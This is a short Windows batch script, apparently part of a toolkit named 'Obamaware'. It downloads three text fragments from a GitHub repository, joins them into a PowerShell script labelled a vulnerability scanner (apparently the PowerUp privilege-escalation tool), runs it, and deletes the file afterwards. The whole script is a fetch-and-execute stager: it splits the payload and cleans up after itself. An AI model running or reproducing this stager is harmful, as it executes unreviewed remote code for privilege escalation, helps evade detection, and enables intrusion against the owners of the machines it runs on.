@ECHO OFF
powershell.exe -Command New-Item ./temp_scanner.ps1
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/powerUp1.txt").Content -Path "./temp_scanner.ps1"
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/powerUp2.txt").Content -Path "./temp_scanner.ps1"
powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/powerUp3.txt").Content -Path "./temp_scanner.ps1"
powershell.exe -Command "./temp_scanner.ps1"
del temp_scanner.ps1